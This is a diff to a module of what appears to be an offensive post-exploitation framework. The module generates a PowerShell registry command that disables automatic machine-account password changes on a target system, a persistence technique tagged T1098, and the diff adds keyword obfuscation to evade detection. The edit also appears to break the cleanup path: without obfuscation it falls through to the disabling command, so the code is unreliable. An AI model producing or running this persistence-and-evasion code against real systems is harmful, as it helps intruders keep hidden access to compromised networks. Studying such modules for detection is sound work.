@@ -1,4 +1,5 @@
 from builtins import object
+
 from lib.common import helpers
 
 
@@ -13,7 +14,11 @@ class Module(object):
             
             'Description': ('Disables the machine account for the target system '
                             'from changing its password automatically.'),
-            
+
+            'Software': '',
+
+            'Techniques': ['T1098'],
+
             'Background': False,
             
             'OutputExtension': None,
@@ -61,13 +66,16 @@ class Module(object):
         
         if cleanup.lower() == 'true':
             script = r"$null=Set-ItemProperty -Force -Path HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters -Name DisablePasswordChange -Value 0; 'Machine account password change re-enabled.'"
-            if obfuscate:
-                script = helpers.obfuscate(self.mainMenu.installPath, psScript=script,
-                                           obfuscationCommand=obfuscationCommand)
+            script = helpers.keyword_obfuscation(script)
+        if obfuscate:
+            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
             return script
         
         script = r"$null=Set-ItemProperty -Force -Path HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters -Name DisablePasswordChange -Value 1; 'Machine account password change disabled.'"
+
         if obfuscate:
             script = helpers.obfuscate(self.mainMenu.installPath, psScript=script,
                                        obfuscationCommand=obfuscationCommand)
+        script = helpers.keyword_obfuscation(script)
+
         return script
